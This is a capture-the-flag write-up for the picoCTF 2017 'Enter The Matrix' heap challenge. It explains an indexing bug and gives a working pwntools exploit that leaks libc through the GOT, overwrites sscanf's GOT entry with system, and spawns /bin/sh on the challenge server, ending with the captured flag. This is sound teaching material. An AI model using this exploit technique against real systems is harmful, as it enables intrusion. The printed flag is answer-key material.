## Enter The Matrix - 150

### Description

The Matrix awaits you,. Take the [red pill](./matrix) and begin your journey. [Source](./matrix.c). Jack in at shell2017.picoctf.com:33490.

### Hint

  - Look carefully at how the matrix is indexed.
  - Study the heap memory layout to see what you can overwrite.

### Write up

There is 2 things we can find in the source code.

```c
else if(2 == sscanf(cmdbuf, "print %d", &id)) {
        handle_print(id);
    }
```

First, `handle_print()` can't be called because compareing value is set to 2. But this one is not important.

```c
m->data[r * m->nrows + c]
```

The important thing is that when referencing the matrix data (in `handle_get()`, `handle_set()`), it uses wrong index.

The right index must be [r * m->ncols + c].

So, by using this mistake, we can modify other matrix's data address like this.

```
create 4 1 --> 4x1 matrix
create 1 1 --> 1x1 matrix

set 0 2 0 <some value> --> matrix[0].data[8] = matrix[1].data
get 1 0 0 --> MODIFIED!!
set 1 0 0 <some value> --> CAN MODIFY CRITICAL AREA
```

What we are going to do is editing GOT entry of functions, especially sscanf to system.

Then, we are going to send `/bin/sh` as a command.    

```
$ readelf -s /lib32/libc.so.6 | grep system
  ...
  1443: 0003e3e0    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

$ readelf -s /lib32/libc.so.6 | grep printf
  ...
  2035: 0004c410  2048 FUNC    GLOBAL DEFAULT   12 printf_size@@GLIBC_2.1
```

Let's get offsets of printf, system from lib.so.6.

```
gdb-peda$ disas printf
Dump of assembler code for function printf@plt:
    0x080484b0 <+0>:	jmp    DWORD PTR ds:0x804a108

gdb-peda$ disas __isoc99_sscanf
Dump of assembler code for function __isoc99_sscanf@plt:
   0x08048540 <+0>:	jmp    DWORD PTR ds:0x804a12c
```

Also GOT entry of printf, sscanf.

```python
from pwn import *
import sys
import struct

SYSTEM_LIBC = 0x3e3e0
PRINTF_LIBC = 0x4cc70

PRINTF_GOT = 0x804a108
SSCANF_GOT = 0x804a12c

p = remote('shell2017.picoctf.com', 33490)
# p = process(['./matrix'])

p.sendline("create 4 1")
p.sendline("create 1 1")
# p.sendline("get 0 2 0")

# leaking printf libc
addr = struct.pack('<L', PRINTF_GOT)
addr = struct.unpack('<f', addr)[0]
p.sendline("set 0 2 0 "+ str(addr))

p.sendline("get 1 0 0")
p.recvuntil('Matrix[0][0] = ')
data = p.recvline()
# print(data)

addr = struct.pack('<f', float(data))
PRINTF_POS = struct.unpack('<L', addr)[0]
SYSTEM_POS = PRINTF_POS - PRINTF_LIBC + SYSTEM_LIBC

print("printf addr : " + hex(PRINTF_POS))
print("system addr : " + hex(SYSTEM_POS))
```

Then, by using printf's GOT address, we can calculate exact address of system.

```python
# changing sscanf's got to system's
addr = struct.pack('<L', SSCANF_GOT)
addr = struct.unpack('<f', addr)[0]
p.sendline("set 0 2 0 " + str(addr))
p.recvline()

addr = struct.pack('<L', SYSTEM_POS)
addr = struct.unpack('<f', addr)[0]
p.sendline("set 1 0 0 " + str(addr))
p.recvline()

p.sendline("/bin/sh")

#p.recvlines(100)
p.interactive()
```

Now, left thing is modifying sscanf's GOT to system's address. And sending the command.

```
python exploit.py                         
[+] Opening connection to shell2017.picoctf.com on port 33490: Done
printf addr : 0xf763bc70
system addr : 0xf762d3e0
[*] Switching to interactive mode
Enter command: $ ls
flag.txt
matrix
xinetd_wrapper.sh
$ cat flag.txt
ebc2aa7c7554ffc1778bed4579c95b2e
$
```

> ebc2aa7c7554ffc1778bed4579c95b2e
